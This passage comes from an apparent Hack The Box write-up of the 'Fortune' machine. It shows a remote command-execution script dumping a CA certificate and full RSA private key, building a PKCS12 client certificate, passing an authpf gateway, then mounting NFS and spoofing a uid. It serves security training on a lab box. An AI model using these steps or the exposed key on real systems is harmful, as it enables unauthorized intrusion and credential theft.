<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">7</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">512</span> <span class="n">Nov</span>  <span class="mi">3</span>  <span class="mi">2018</span> <span class="o">..</span>
<span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>  <span class="n">bob</span>  <span class="mi">4114</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">ca</span><span class="o">-</span><span class="n">chain</span><span class="o">.</span><span class="n">cert</span><span class="o">.</span><span class="n">pem</span>
<span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>  <span class="n">bob</span>  <span class="mi">1996</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">fortune</span><span class="o">.</span><span class="n">htb</span><span class="o">.</span><span class="n">cert</span><span class="o">.</span><span class="n">pem</span>
<span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>  <span class="n">bob</span>  <span class="mi">2061</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">intermediate</span><span class="o">.</span><span class="n">cert</span><span class="o">.</span><span class="n">pem</span>

<span class="p">[</span><span class="err">?</span><span class="p">]</span> <span class="n">command</span> <span class="p">:</span> <span class="n">ls</span> <span class="o">-</span><span class="n">la</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">bob</span><span class="o">/</span><span class="n">ca</span><span class="o">/</span><span class="n">intermediate</span><span class="o">/</span><span class="n">private</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Result</span> <span class="p">:</span>

<span class="n">total</span> <span class="mi">20</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">512</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">7</span> <span class="n">bob</span>  <span class="n">bob</span>   <span class="mi">512</span> <span class="n">Nov</span>  <span class="mi">3</span>  <span class="mi">2018</span> <span class="o">..</span>
<span class="o">-</span><span class="n">r</span><span class="o">--------</span>  <span class="mi">1</span> <span class="n">bob</span>  <span class="n">bob</span>  <span class="mi">1675</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">fortune</span><span class="o">.</span><span class="n">htb</span><span class="o">.</span><span class="n">key</span><span class="o">.</span><span class="n">pem</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">bob</span>  <span class="n">bob</span>  <span class="mi">3243</span> <span class="n">Oct</span> <span class="mi">29</span>  <span class="mi">2018</span> <span class="n">intermediate</span><span class="o">.</span><span class="n">key</span><span class="o">.</span><span class="n">pem</span>

<span class="p">[</span><span class="err">?</span><span class="p">]</span> <span class="n">command</span> <span class="p">:</span> <span class="n">cat</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">bob</span><span class="o">/</span><span class="n">ca</span><span class="o">/</span><span class="n">intermediate</span><span class="o">/</span><span class="n">certs</span><span class="o">/</span><span class="n">intermediate</span><span class="o">.</span><span class="n">cert</span><span class="o">.</span><span class="n">pem</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Result</span> <span class="p">:</span>

<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>                           
<span class="n">MIIFxDCCA6ygAwIBAgICEAAwDQYJKoZIhvcNAQELBQAwbTELMAkGA1UEBhMCQ0Ex</span>
<span class="n">CzAJBgNVBAgMAk9OMRcwFQYDVQQKDA5Gb3J0dW5lIENvIEhUQjEYMBYGA1UEAwwP</span>
<span class="n">Rm9ydHVuZSBSb290IENBMR4wHAYJKoZIhvcNAQkBFg9ib2JAZm9ydHVuZS5odGIw</span>
<span class="n">HhcNMTgxMDMwMDA1NjQzWhcNMjgxMDI3MDA1NjQzWjB1MQswCQYDVQQGEwJDQTEL</span>
<span class="n">MAkGA1UECAwCT04xFzAVBgNVBAoMDkZvcnR1bmUgQ28gSFRCMSAwHgYDVQQDDBdG</span>
<span class="n">b3J0dW5lIEludGVybWVkaWF0ZSBDQTEeMBwGCSqGSIb3DQEJARYPYm9iQGZvcnR1</span>
<span class="n">bmUuaHRiMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAuTGpzUbl4RIy</span>
<span class="n">DuJv8S36vZm96P8FoUgseznDqNOqAEN</span><span class="o">+</span><span class="n">qU6NTzZAjOvCAJu7tiJjnvrUxf4SzuLR</span>
<span class="n">QEsU99R6UDBj</span><span class="o">/</span><span class="n">rz1dMRq3P</span><span class="o">/</span><span class="mi">7</span><span class="n">VdbNC5o2zrd99fN</span><span class="o">/</span><span class="n">MDz288Rv7Z24LKWvPoEFWU5D</span>
<span class="n">SpQo</span><span class="o">+</span><span class="n">lregWcl4yzTS0hHQjjk</span><span class="o">/</span><span class="n">aGPPkLFhT1oW</span><span class="o">/</span><span class="n">kbz9205JT1LvR</span><span class="o">+</span><span class="n">mqNWbH</span><span class="o">/</span><span class="mi">0</span><span class="n">Q92K</span>
<span class="mi">7</span><span class="n">Ns3b2UqEdvD0nm</span><span class="o">/</span><span class="n">t7SAphhkGYEtsxyEdiI97sB6jXxlgHzblwFlQaHvh6H7u6rC</span>
<span class="n">m</span><span class="o">/</span><span class="n">VGQDFmY3d</span><span class="o">/</span><span class="n">zA1TtZ0vuAJ2</span><span class="o">/</span><span class="n">EEs0NU6XySL6YmfIsPJdu4NoeEeXofqwQjNf2bs</span>
<span class="n">jgQZrOujLxTBo1L4cFsNvZVwwNscyr</span><span class="o">+</span><span class="n">wZM</span><span class="o">/</span><span class="n">SybEGB3vBe4e</span><span class="o">+</span><span class="n">wvzkT7YD4lqubvXZ</span>
<span class="n">O346jKcnOF</span><span class="o">/</span><span class="n">lviF6HmxhUL5pac4XHNYPJhVoKmimYUWi2fJ</span><span class="o">/</span><span class="mi">1</span><span class="n">B2PgRrzv</span><span class="o">/</span><span class="n">mmlgL7</span>
<span class="n">JOpJNWMUbc8bEf698QziuCXj5R</span><span class="o">/+</span><span class="n">Lover058nrvCAnI4I4wUHTGAgOC1J4hbVoYX</span>
<span class="n">EjK1GT</span><span class="o">+</span><span class="n">zlnX9</span><span class="o">+</span><span class="n">JAqGthxxqQp</span><span class="o">/</span><span class="n">YXYk1lgA5xpANJIlxH0gwaTQ4a8HAPBliHnEV0v</span>
<span class="n">XK38</span><span class="o">+</span><span class="n">yzRe1</span><span class="o">/</span><span class="n">uD3OUWKw</span><span class="o">+</span><span class="n">DYD</span><span class="o">/</span><span class="n">EmH78QiAr7Yb7K4H1yh5VF9zkLCTN6WYoaSM1Z0T</span>
<span class="n">nb8nv8SUuSwsa</span><span class="o">/</span><span class="n">piZvRo7VqzYbDtl8MCAwEAAaNmMGQwHQYDVR0OBBYEFNBS</span><span class="o">/</span><span class="n">hId</span>
<span class="n">Md8NPcYbC32</span><span class="o">/</span><span class="n">OSwFbZzUMB8GA1UdIwQYMBaAFFOdNrSGE</span><span class="o">+</span><span class="n">IcSQJs1UTIogSJ2i5W</span>
<span class="n">MBIGA1UdEwEB</span><span class="o">/</span><span class="n">wQIMAYBAf8CAQAwDgYDVR0PAQH</span><span class="o">/</span><span class="n">BAQDAgGGMA0GCSqGSIb3DQEB</span>
<span class="n">CwUAA4ICAQAJ0</span><span class="o">/</span><span class="n">abFm23OqxhuRPiGr7VfRn8DbsyQ7oVB8zxJsgfgWkXTKuTtJti</span>
<span class="n">zhZSFR8</span><span class="o">/</span><span class="n">JMUYhRLwdkjf8w3hA7GKF9VS3kioEDGROtx</span><span class="o">++</span><span class="n">ZQc1ljI7owLfDYfhQ08</span>
<span class="mi">0</span><span class="n">CJiXxmwO4XupL23cxu9i9464</span><span class="o">+</span><span class="n">knHvqvE1Uhj</span><span class="o">/</span><span class="n">L9HO5pVD5uAS2kePnSju7n08gg</span>
<span class="n">miqzREAc0qzehpoJXuS50wJc4otGgU5l</span><span class="o">+</span><span class="n">Rsen8giWdR0a1TxKm2UF</span><span class="o">/</span><span class="n">wFQbSU</span><span class="o">+</span><span class="n">WwY</span>
<span class="mi">8</span><span class="n">F5PquwOz384mmQ</span><span class="o">/</span><span class="mi">3</span><span class="n">k6SVj6HStCFb47bHEpvS5mvj2lzJMiLFtYkzSe2fDJJ444I</span>
<span class="mi">1</span><span class="n">Y4UXIOE</span><span class="o">/</span><span class="n">nKK</span><span class="o">/</span><span class="n">UDw4tOquxcYVD0oJ0lxpFhpSVtRu9R5cqYPJI2POQTj6Ucb7i</span><span class="o">+</span><span class="mi">3</span>
<span class="n">OpY</span><span class="o">+</span><span class="n">NpJ0mjem7</span><span class="o">/</span><span class="n">d1yCDtKIbz4pcJoaAtVQVDdzywPTe3LcdnGutvfiYJZJW</span><span class="o">/</span><span class="n">ENNG</span>
<span class="n">z3Iw0vkQCeJTsUMg45x88QzAg8IG0jkqT0PEhXD6ul4fAgm0</span><span class="o">/</span><span class="mi">8</span><span class="n">BCuEwNuMz9mHc9</span>
<span class="n">DFhdfx5zU8OYUVpw4UB8IC2wbybyW</span><span class="o">+</span><span class="n">ftkcsfLngYasH3cZa1GpXq</span><span class="o">/</span><span class="n">qDByCW2C8kg</span>
<span class="n">z4mKdO3yVIf087hyfCKWSH9OAH1FEDnhkWbLhkGcJENrIJuO7CNYRyBIjd1jxtUv</span>
<span class="n">HinFDCeM</span><span class="o">/</span><span class="n">GeMJr2W154CniHjtXoiEeZ8LRY73qESZBqXukWxbOa7sA</span><span class="o">==</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>

<span class="p">[</span><span class="err">?</span><span class="p">]</span> <span class="n">command</span> <span class="p">:</span> <span class="n">cat</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">bob</span><span class="o">/</span><span class="n">ca</span><span class="o">/</span><span class="n">intermediate</span><span class="o">/</span><span class="n">private</span><span class="o">/</span><span class="n">intermediate</span><span class="o">.</span><span class="n">key</span><span class="o">.</span><span class="n">pem</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Result</span> <span class="p">:</span>


<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
<span class="n">MIIJKQIBAAKCAgEAuTGpzUbl4RIyDuJv8S36vZm96P8FoUgseznDqNOqAEN</span><span class="o">+</span><span class="n">qU6N</span>
<span class="n">TzZAjOvCAJu7tiJjnvrUxf4SzuLRQEsU99R6UDBj</span><span class="o">/</span><span class="n">rz1dMRq3P</span><span class="o">/</span><span class="mi">7</span><span class="n">VdbNC5o2zrd9</span>
<span class="mi">9</span><span class="n">fN</span><span class="o">/</span><span class="n">MDz288Rv7Z24LKWvPoEFWU5DSpQo</span><span class="o">+</span><span class="n">lregWcl4yzTS0hHQjjk</span><span class="o">/</span><span class="n">aGPPkLFhT1o</span>
<span class="n">W</span><span class="o">/</span><span class="n">kbz9205JT1LvR</span><span class="o">+</span><span class="n">mqNWbH</span><span class="o">/</span><span class="mi">0</span><span class="n">Q92K7Ns3b2UqEdvD0nm</span><span class="o">/</span><span class="n">t7SAphhkGYEtsxyEdiI9</span>
<span class="mi">7</span><span class="n">sB6jXxlgHzblwFlQaHvh6H7u6rCm</span><span class="o">/</span><span class="n">VGQDFmY3d</span><span class="o">/</span><span class="n">zA1TtZ0vuAJ2</span><span class="o">/</span><span class="n">EEs0NU6XySL</span>
<span class="mi">6</span><span class="n">YmfIsPJdu4NoeEeXofqwQjNf2bsjgQZrOujLxTBo1L4cFsNvZVwwNscyr</span><span class="o">+</span><span class="n">wZM</span><span class="o">/</span><span class="n">S</span>
<span class="n">ybEGB3vBe4e</span><span class="o">+</span><span class="n">wvzkT7YD4lqubvXZO346jKcnOF</span><span class="o">/</span><span class="n">lviF6HmxhUL5pac4XHNYPJhVo</span>
<span class="n">KmimYUWi2fJ</span><span class="o">/</span><span class="mi">1</span><span class="n">B2PgRrzv</span><span class="o">/</span><span class="n">mmlgL7JOpJNWMUbc8bEf698QziuCXj5R</span><span class="o">/+</span><span class="n">Lover058</span>
<span class="n">nrvCAnI4I4wUHTGAgOC1J4hbVoYXEjK1GT</span><span class="o">+</span><span class="n">zlnX9</span><span class="o">+</span><span class="n">JAqGthxxqQp</span><span class="o">/</span><span class="n">YXYk1lgA5xp</span>
<span class="n">ANJIlxH0gwaTQ4a8HAPBliHnEV0vXK38</span><span class="o">+</span><span class="n">yzRe1</span><span class="o">/</span><span class="n">uD3OUWKw</span><span class="o">+</span><span class="n">DYD</span><span class="o">/</span><span class="n">EmH78QiAr7Yb</span>
<span class="mi">7</span><span class="n">K4H1yh5VF9zkLCTN6WYoaSM1Z0Tnb8nv8SUuSwsa</span><span class="o">/</span><span class="n">piZvRo7VqzYbDtl8MCAwEA</span>
<span class="n">AQKCAgEAkjfD</span><span class="o">+</span><span class="n">W</span><span class="o">+</span><span class="n">g0LOtElN2TtYewtRAPVYc</span><span class="o">+</span><span class="mi">9</span><span class="n">ogRKq28PUtpEemGccLix8qmBkM</span>
<span class="n">c66B5qwAO</span><span class="o">+</span><span class="n">WPWUPhVbd</span><span class="o">/</span><span class="n">v2OIiqQYbnfGe7p1klwCg7sYlg2ilyaLX2tA6I</span><span class="o">/</span><span class="mi">4</span><span class="n">O</span><span class="o">/</span><span class="mi">3</span><span class="n">m</span>
<span class="n">fVD7joCYiafHVXJI5toEBz4znHdidokaQOODcE0A9ig1pIuKrX3Ktghl</span><span class="o">/</span><span class="n">TgR3W0P</span>
<span class="n">BesWKpyf2ThdZA0irvKcXaY3fpxBOxho5CV8WW8KpBld70Uu79v0OdGPVJJkMJGn</span>
<span class="n">EmuCdReE</span><span class="o">+</span><span class="n">u0AUfZy6xlHzhs5</span><span class="o">/</span><span class="n">DUEwkP3gwSCs0IICyDnEQPkfn3cOIKCdUFTg</span><span class="o">/</span><span class="mi">9</span><span class="n">R</span>
<span class="n">cbVCzi0P7VMi5oYsugppezeBjiX</span><span class="o">+</span><span class="n">EDQogYDpSF94aFy8FdG6UgGLUpicNyG93niL</span>
<span class="n">iXTJ0X0MS1E1AWSvECguIuUaNuDW</span><span class="o">+</span><span class="n">ZOdMCGoKKVCjTzHGvMunSP5ibIhSprhf4v0</span>
<span class="n">KrBxalXAZafq6jVrEkQkNQrVVaodkFMFH4</span><span class="o">+</span><span class="n">J3Sa8Zi1mOiQ9xFmGMV</span><span class="o">+</span><span class="mi">8</span><span class="n">AUiz899J</span>
<span class="mi">4</span><span class="n">PHcf7WzLb</span><span class="o">/</span><span class="n">FilyhwIM3HPSI7n3mJ0x7xkuQ3COxioVbvCkz0fAaQzz1U8h</span><span class="o">/</span><span class="n">pFxV</span>
<span class="o">+</span><span class="n">wfx2X5F3N8RzU5ufR</span><span class="o">/</span><span class="n">M</span><span class="o">/</span><span class="n">Asni8RId7M8TJ44qWQln8itM</span><span class="o">+</span><span class="mi">0</span><span class="n">aWTKiLrhBOcC55eug</span>
<span class="n">hHIop2z</span><span class="o">+</span><span class="n">amPqxsynTVbbmiVwGpCYGNt3Q</span><span class="o">/</span><span class="mi">7</span><span class="o">/</span><span class="n">FovcxF36hkbULwECggEBAPPgQwX4</span>
<span class="n">gL9PBBwSi2oCS</span><span class="o">+</span><span class="mi">164</span><span class="n">tSTc0B3R31B0AatewdXyASNYml9rCTOa</span><span class="o">/</span><span class="n">VJntvIAHDvWQ3</span><span class="o">+</span>
<span class="n">wfrf34</span><span class="o">/</span><span class="mi">1</span><span class="n">DIdZttwPYpcKAiWz</span><span class="o">/</span><span class="n">CXqPqEhd3uFLOrRoo1xBaenwLvCI99cYEvcrQIF</span>
<span class="n">ctBDsqGytJ</span><span class="o">/</span><span class="n">Begs7dg04KLZUbsoYVTzkwf9O0I1aEHY4r9cUfXyPBYFl1qJdJoY1</span>
<span class="mi">83</span><span class="n">sZAZo</span><span class="o">+</span><span class="n">DXLdmtXVpoM</span><span class="o">/</span><span class="mi">8</span><span class="n">MlhnMfg9VQ</span><span class="o">+</span><span class="n">txrMZg</span><span class="o">+</span><span class="mi">1</span><span class="n">zEiuiNY9Rmv6CDpx68WcNKxF</span>
<span class="n">y6mEkR8Ux3ZdHht</span><span class="o">/</span><span class="mi">9</span><span class="n">azTU9n2btsx3EPBviwgiXuPLdCwyjfopcUaj</span><span class="o">+</span><span class="mi">2</span><span class="n">cX9n5dO5E</span>
<span class="n">HFZXUnQKj5UgttcCggEBAMJmkplp9ofzkF17Z</span><span class="o">+</span><span class="n">B6u</span><span class="o">/</span><span class="n">PJHmFKBn</span><span class="o">/</span><span class="n">PgD1NKBlGINIY</span>
<span class="n">wh</span><span class="o">/</span><span class="mi">3</span><span class="n">mFq1AvqHqy9Y9q9H</span><span class="o">+</span><span class="n">S</span><span class="o">/</span><span class="n">rIr8i</span><span class="o">+</span><span class="n">ADi39lWUywYWbGxpTJ6q68tKJR2UVxP0otZ</span>
<span class="n">CRqtqV</span><span class="o">/</span><span class="n">BUhADeXrxnSdTEtA9CTgLEn</span><span class="o">+</span><span class="n">fHbDGwzW1nhB</span><span class="o">/</span><span class="n">EsEfQFQBx31juR2k5kR3</span>
<span class="n">LFpiex3zAvVYOuM9fkHsCp5rDsvv10</span><span class="o">/</span><span class="mi">6</span><span class="o">+</span><span class="n">aUzVOXwYzNfDBU9PpdK0AnTy0rijXM4</span>
<span class="mi">4</span><span class="n">Ky6</span><span class="o">/</span><span class="n">DFEMRCh1yC</span><span class="o">/</span><span class="n">O99u8AomyvlPJXyOFlrijUikBGpBUE60zB0dFw62NlBZg0BX</span>
<span class="n">po2sJnPZYgERFCb2jCK2SJnWWgtPvQbwHqXBLj4uxPUCggEBALEHSP</span><span class="o">/</span><span class="n">LjQHSRORv</span>
<span class="mi">3</span><span class="n">b29HwqrWn7</span><span class="o">+</span><span class="mi">7</span><span class="n">fmM3Fsja</span><span class="o">/</span><span class="n">N8</span><span class="o">+</span><span class="n">MKyyOHtE9QJwu0Q3rM2ltdpjlBsnhOXq44F9s4U</span>
<span class="n">Dt0tlZyWmnWTcU2XImEPchkbJxWF7b4jIMFVmspB7pkc61dXQhuve</span><span class="o">/</span><span class="n">Lsq5RcoA3a</span>
<span class="n">oF0bYBFJP3</span><span class="o">+</span><span class="n">HFZ6NGcMf</span><span class="o">+</span><span class="n">Lf0QpKmzqLdDvgSXCpfmFvToiZ1G2HPBokEHtNrqosh</span>
<span class="n">ojeQf7XbmjzKLGqyrdE2Dj</span><span class="o">/</span><span class="n">yKo6Mc0XSLRFRiMkjv7vfyxtJ2OEga</span><span class="o">+</span><span class="n">fl3loWfhW2</span>
<span class="n">yre0Dofd0iN7X</span><span class="o">/</span><span class="n">Hnfj8lKYQR3o8</span><span class="o">/</span><span class="n">qy0DGTnVK2V8PuEeT</span><span class="o">/</span><span class="mi">4</span><span class="n">mtjmPaH8Q</span><span class="o">+</span><span class="n">BUA3DyZ</span>
<span class="mi">8</span><span class="n">fJJxg8CggEAJ</span><span class="o">+</span><span class="n">AoZAWjRyHD1BkTJq2mTgxMCgLIMIFcubZQ6lZDNzVS5IHCI6EL</span>
<span class="n">ml4n1A94kl2</span><span class="o">+</span><span class="n">FIEz4GcI3g2rgwY9C0d3Zoac7yzQeJ9XupRGfhv1gRXjUzCaFIUw</span>
<span class="n">Ew7TZU</span><span class="o">+</span><span class="n">YP8</span><span class="o">+/</span><span class="n">hS1v7an</span><span class="o">/</span><span class="n">wmPeEDvFIQg</span><span class="o">/</span><span class="n">Av092JVTeaffxq2k9Bq2DQcw9t1Kicsm</span>
<span class="n">KTNO6PvdISKMzxAAuf5ZeRNvD97mpD</span><span class="o">/</span><span class="n">Z6ViuvtCQPTJgWBO0mIi</span><span class="o">+</span><span class="n">IQtisqusPWLS</span>
<span class="n">eano2dPAMUWtQTfR3K</span><span class="o">/</span><span class="n">KbbErjrr35hWWvkDley</span><span class="o">+</span><span class="n">EytgDucXQgEzMKm</span><span class="o">+</span><span class="n">QP3E3df36</span>
<span class="n">J2PccV2TQy</span><span class="o">+</span><span class="n">G1t9sGvPhP0IT10Y3</span><span class="o">+</span><span class="n">RNY3QKCAQBCgyEOu2PEHO4FHHJsyXSN9als</span>
<span class="n">OZa</span><span class="o">+</span><span class="n">sOykZ</span><span class="o">/</span><span class="mi">7</span><span class="n">fdjBZpAsjvcmxUfAxT07</span><span class="o">+</span><span class="n">EVUz4Wo186BKlthQjVLoLd2QfeTYmGhj</span>
<span class="n">IsZnjm0Ds8ezFka</span><span class="o">/</span><span class="mi">3</span><span class="n">Cu7YwGt6MBfUO6Vq2MLlUDgvtcWPTvBvipfmfZtJ0x2hhNv</span>
<span class="n">y6Lpg</span><span class="o">/</span><span class="n">KJrald3NHrIcS4GvE8gxz1AFmMM0j00EuJSZk66hpC2bBKMunXAquPDN3g</span>
<span class="n">XPwjyvXUcxDf8Jx1MGFfO</span><span class="o">++</span><span class="mi">6</span><span class="n">RlZMEO7jmB</span><span class="o">/</span><span class="n">xgonPkWP4xEcQlOQ65UfhpLjfum96</span>
<span class="n">Ma9MyI3TStZzH998nMBc3LsUbXnDr0yofBt1AsLz3JsBHcgRIxYzzvtlIpjk</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
</code></pre></div></div>
<p><br> We can use them to generate a <code class="highlighter-rouge">PKCS12</code> certificate to access the <code class="highlighter-rouge">https</code> service. with <code class="highlighter-rouge">openssl</code> we can do it with a single command :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl pkcs12 -export -in intermediate.cert.pem -inkey intermediate.key.pem -out fortune.p12
</code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune/cert# ls -al
total 20
drwxr-xr-x 2 root root 4096 Aug  2 13:40 .
drwxr-xr-x 3 root root 4096 Aug  2 13:40 ..
-rw-r--r-- 1 root root 6810 Aug  2 13:40 intermediate.cert.pem
-rw-r--r-- 1 root root 3243 Aug  2 13:40 intermediate.key.pem
root@kali:~/Desktop/HTB/boxes/fortune/cert# openssl pkcs12 -export -in intermediate.cert.pem -inkey intermediate.key.pem -out fortune.p12
Enter Export Password:
Verifying - Enter Export Password:
root@kali:~/Desktop/HTB/boxes/fortune/cert# ls -la
total 28
drwxr-xr-x 2 root root 4096 Aug  2 13:43 .
drwxr-xr-x 3 root root 4096 Aug  2 13:40 ..
-rw------- 1 root root 4237 Aug  2 13:43 fortune.p12
-rw-r--r-- 1 root root 6810 Aug  2 13:40 intermediate.cert.pem
-rw-r--r-- 1 root root 3243 Aug  2 13:40 intermediate.key.pem
root@kali:~/Desktop/HTB/boxes/fortune/cert# 
</code></pre></div></div>
<p><br> Now we can import the certificate in Firefox :
<br><img src="/images/hackthebox/fortune/7.png" alt=""><br>
<br><img src="/images/hackthebox/fortune/8.png" alt=""><br>
<br><img src="/images/hackthebox/fortune/9.png" alt=""><br>
<br> After removing the SSL exception it will ask for our certificate and give us access :
<br><img src="/images/hackthebox/fortune/10.png" alt=""><br></p>
<hr>

<h2 id="elevated-network-access-nfs-user-flag">Elevated Network Access, NFS, User Flag</h2>
<p><br> After getting access to <code class="highlighter-rouge">https</code> this message is what’s on the index page :
<br><img src="/images/hackthebox/fortune/11.png" alt=""><br>
<br> I didn’t know what <code class="highlighter-rouge">authpf</code> was so I searched about it.</p>

<blockquote>
  <p>authpf is a user shell for authenticating gateways. It is used to change pf rules when a user authenticates and starts a session with sshd and to undo these changes when the user’s session exits. It is designed for changing filter and translation rules for an individual source IP address as long as a user maintains an active ssh session. Typical use would be for a gateway that authenticates users before allowing them Internet use, or a gateway that allows different users into different places.  - <a href="https://www.freebsd.org/cgi/man.cgi?query=authpf&amp;apropos=0&amp;sektion=8&amp;manpath=FreeBSD+8.1-RELEASE+and+Ports&amp;format=html" target="_blank" rel="noopener noreferrer">freeBSD manual</a></p>
</blockquote>

<p><br> So basically this can give access to some filtered services we weren’t allowed to access before, to use it we need a key and luckily we can generate one :
<br><img src="/images/hackthebox/fortune/12.png" alt=""><br>
<br> We have 3 users on the box, I tried all of them and <code class="highlighter-rouge">nfsuser</code> worked :
<br><img src="/images/hackthebox/fortune/13.png" alt=""><br>
<br> Now is the time for another <code class="highlighter-rouge">nmap</code> scan :
<br><code class="highlighter-rouge">nmap -sV -sT -sC fortune.htb</code>
<br><img src="/images/hackthebox/fortune/14.png" alt=""><br>
<br> We have two new ports, 8081 which is running <code class="highlighter-rouge">http</code> and <code class="highlighter-rouge">2049</code> which is running <code class="highlighter-rouge">nfs</code>. The <code class="highlighter-rouge">http</code> service gives us this message :
<br><img src="/images/hackthebox/fortune/15.png" alt=""><br>
<br> So probably we need to focus on <code class="highlighter-rouge">nfs</code>.</p>

<blockquote>
  <p><strong>Network File System</strong> (<strong>NFS</strong>) is a <a href="https://en.wikipedia.org/wiki/Distributed_file_system" target="_blank" rel="noopener noreferrer">distributed file system</a> protocol originally developed by <a href="https://en.wikipedia.org/wiki/Sun_Microsystems" target="_blank" rel="noopener noreferrer">Sun Microsystems</a> in 1984, allowing a user on a client <a href="https://en.wikipedia.org/wiki/Computer" target="_blank" rel="noopener noreferrer">computer</a> to access files over a <a href="https://en.wikipedia.org/wiki/Computer_network" target="_blank" rel="noopener noreferrer">computer network</a> much like local storage is accessed.  -<a href="https://en.wikipedia.org/wiki/Network_File_System" target="_blank" rel="noopener noreferrer">Wikipedia</a></p>
</blockquote>

<p><br> I used the <code class="highlighter-rouge">RCE</code> script to check <code class="highlighter-rouge">/etc/exports</code> and the only thing there was <code class="highlighter-rouge">/home</code> :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="err">?</span><span class="p">]</span> <span class="n">command</span> <span class="p">:</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">exports</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Result</span> <span class="p">:</span>

<span class="o">/</span><span class="n">home</span>
</code></pre></div></div>
<p><br> By using <code class="highlighter-rouge">nfs-ls</code> (which is a part of the package <code class="highlighter-rouge">libnfs-utils</code>) we can successfully list the directories :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune# nfs-ls nfs://fortune.htb/home
drwxr-xr-x  2  1002  1002          512 nfsuser
drwxr-xr-x  5  1001  1001          512 bob
drwxr-x---  3  1000  1000          512 charlie
</code></pre></div></div>
<p><br> I created a directory, called it <code class="highlighter-rouge">mnt</code> and mounted the <code class="highlighter-rouge">nfs</code> share in it :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune# mkdir mnt &amp;&amp; mount -t nfs fortune.htb:/home ./mnt
root@kali:~/Desktop/HTB/boxes/fortune# ls -la mnt
total 12
drwxr-xr-x 5 root root  512 Nov  3  2018 .
drwxr-xr-x 4 root root 4096 Aug  2 14:23 ..
drwxr-xr-x 5 1001 1001  512 Nov  3  2018 bob
drwxr-x--- 3 rick rick  512 Aug  2 12:21 charlie
drwxr-xr-x 2 1002 1002  512 Nov  3  2018 nfsuser
root@kali:~/Desktop/HTB/boxes/fortune# 
</code></pre></div></div>
<p><br> However I couldn’t access <code class="highlighter-rouge">charlie</code>’s directory :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune# cd mnt
root@kali:~/Desktop/HTB/boxes/fortune/mnt# cd charlie
-bash: cd: charlie: Permission denied
</code></pre></div></div>
<p><br> This is because I’m trying with <code class="highlighter-rouge">root</code> whose <code class="highlighter-rouge">uid</code> is <code class="highlighter-rouge">0</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/fortune/mnt# id 
uid=0(root) gid=0(root) groups=0(root)
root@kali:~/Desktop/HTB/boxes/fortune/mnt# 
</code></pre></div></div>
<p><br> And the way <code class="highlighter-rouge">nfs</code> permissions work I need to have the same <code class="highlighter-rouge">uid</code> as <code class="highlighter-rouge">charlie</code> which is <code class="highlighter-rouge">1000</code> :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="err">?</span><span class="p">]</span> <span class="n">command</span> <span class="p">:</span> <span class="nb">id</span> <span class="n">charlie</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Result</span> <span class="p">:</span>

<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">charlie</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">charlie</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">charlie</span><span class="p">),</span> <span class="mi">0</span><span class="p">(</span><span class="n">wheel</span><span class="p">)</span>
